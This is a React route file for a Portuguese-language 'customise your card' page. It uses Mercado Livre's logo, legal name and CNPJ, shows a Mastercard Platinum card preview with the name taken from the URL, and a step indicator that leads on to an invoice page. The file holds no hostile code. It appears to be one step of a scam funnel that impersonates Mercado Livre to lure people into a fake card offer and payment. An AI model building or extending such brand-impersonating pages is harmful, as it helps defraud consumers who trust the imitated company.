import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";
import { FunnelSteps } from "@/components/FunnelSteps";
import mlHandshake from "@/assets/ml-handshake.png";
import mastercard from "@/assets/mastercard.png";
import cardChip from "@/assets/card-chip.png";

export const Route = createFileRoute("/personalizar")({
  head: () => ({
    meta: [
      { title: "Personalize seu cartão - Mercado Livre" },
      { name: "description", content: "Escolha a cor do seu novo cartão." },
    ],
  }),
  component: Personalizar,
});

const colors = [
  { name: "Azul", value: "#3483FA", gradient: "from-[#3483FA] to-[#2968C8]" },
  { name: "Amarelo", value: "#FFE600", gradient: "from-[#FFE600] to-[#E6CC00]" },
  { name: "Vermelho", value: "#E53935", gradient: "from-[#E53935] to-[#B71C1C]" },
  { name: "Cinza", value: "#9E9E9E", gradient: "from-[#9E9E9E] to-[#616161]" },
  { name: "Preto", value: "#1A1A1A", gradient: "from-[#2D2D2D] to-[#0A0A0A]" },
];

function Personalizar() {
  const navigate = useNavigate();
  const [selected, setSelected] = useState(0);
  const card = colors[selected];
  const isLight = card.value === "#FFE600";
  const textColor = isLight ? "text-gray-800" : "text-white";
  const subTextColor = isLight ? "text-gray-700/70" : "text-white/70";
  const platinumColor = isLight ? "text-gray-700" : "text-white/80";

  // Get name from URL query string
  const nome =
    typeof window !== "undefined"
      ? new URLSearchParams(window.location.search).get("nome")?.toUpperCase() ||
        "NOME DO TITULAR"
      : "NOME DO TITULAR";

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>
      <FunnelSteps current={3} />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          <h1 className="text-2xl font-bold text-gray-800 text-center mb-6">
            Personalize o seu cartão
          </h1>

          {/* Credit card preview */}
          <div
            className={`relative w-full aspect-[1.75/1] rounded-2xl bg-gradient-to-br ${card.gradient} p-5 shadow-xl mb-6 overflow-hidden transition-all duration-300`}
          >
            {/* diagonal sheen lines */}
            <div
              className="absolute inset-0 opacity-[0.18] pointer-events-none"
              style={{
                backgroundImage:
                  "repeating-linear-gradient(135deg, rgba(255,255,255,0.6) 0px, rgba(255,255,255,0.6) 1px, transparent 1px, transparent 6px)",
              }}
            />
            <div className="absolute inset-0 opacity-20 bg-[radial-gradient(circle_at_top_right,white,transparent_60%)]" />

            {/* Top row */}
            <div className="flex justify-between items-start relative">
              <img
                src={mlHandshake}
                alt="Mercado Livre"
                className="h-10 object-contain drop-shadow"
              />
              <span className={`${platinumColor} text-xs tracking-[0.2em] font-semibold`}>
                PLATINUM
              </span>
            </div>

            {/* Chip */}
            <div className="absolute left-5 top-1/2 -translate-y-1/2">
              <img src={cardChip} alt="Chip" className="w-12 h-9 object-contain drop-shadow" />
            </div>

            {/* Contactless */}
            <svg
              viewBox="0 0 24 24"
              className={`absolute right-5 top-1/2 -translate-y-1/2 w-5 h-5 ${textColor} rotate-90`}
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
            >
              <path d="M5 8c4-4 10-4 14 0" />
              <path d="M8 11c2.5-2.5 5.5-2.5 8 0" />
              <path d="M11 14c1-1 2-1 2 0" />
            </svg>

            {/* Bottom */}
            <div className="absolute bottom-4 left-5 right-5 flex justify-between items-end">
              <div>
                <div className={`${textColor} font-semibold tracking-wider text-sm`}>{nome}</div>
                <div className={`${subTextColor} text-[10px] tracking-wider`}>TITULAR DO CARTÃO</div>
              </div>
              <img src={mastercard} alt="Mastercard" className="h-8 object-contain" />
            </div>
          </div>

          {/* Color picker */}
          <div className="flex justify-center gap-4 mb-6">
            {colors.map((c, i) => (
              <button
                key={c.name}
                onClick={() => setSelected(i)}
                aria-label={`Cor ${c.name}`}
                className={`w-10 h-10 rounded-full flex items-center justify-center shadow-md transition-all ${
                  selected === i ? "ring-2 ring-offset-2 ring-[#3483FA] scale-110" : "hover:scale-105"
                }`}
                style={{ backgroundColor: c.value }}
              >
                {selected === i && (
                  <svg viewBox="0 0 24 24" className={`w-5 h-5 ${c.value === "#FFE600" ? "text-gray-800" : "text-white"}`} fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                )}
              </button>
            ))}
          </div>

          <button
            onClick={() => navigate({ to: "/fatura" })}
            className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md shadow-md transition-all"
          >
            Continuar
          </button>
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
          <a href="#" className="text-[#3483FA]">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
